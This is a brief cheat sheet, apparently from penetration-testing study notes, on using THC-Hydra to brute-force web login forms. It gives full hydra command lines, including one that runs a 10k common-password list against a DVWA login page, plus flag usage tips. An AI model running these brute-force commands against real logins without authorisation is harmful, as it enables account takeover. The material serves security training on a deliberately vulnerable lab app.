### THC-Hydra
#### Very fast network logon cracker

Hydra is a parallelized login cracker which supports numerous protocols to attack.

----------

#### Cheatsheet

##### Web login bruteforce

```
hydra -l admin -p admin <IP/DOMAIN> http-get-form "/path:params:H=Cookie\: ...:F=failure text" -t 64
```

Example
```
hydra -l admin -P /opt/seclists/Passwords/Common-Credentials/10k-most-common.txt <IP/DOMAIN> http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login&user_token=6984e51d6b542c558d99bd109585a3d5:F=Username and/or password incorrect" -t 1
```

----------

#### Notes

The flag :F= must be in the last position!

-V to see each attempt

----------

#### Resources:

 - https://www.golinuxcloud.com/brute-force-attack-web-forms/
